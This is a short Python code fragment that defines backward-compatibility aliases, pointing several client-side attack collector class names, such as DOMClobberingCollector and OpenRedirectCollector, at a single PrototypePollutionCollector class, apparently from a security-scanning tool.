# =============================================================================
# Backward Compatibility Aliases
# =============================================================================

ClientSideAttackCollector = PrototypePollutionCollector
DOMClobberingCollector = PrototypePollutionCollector
OpenRedirectCollector = PrototypePollutionCollector
ClickjackingCollector = PrototypePollutionCollector
ProtoPollutionCollector = PrototypePollutionCollector
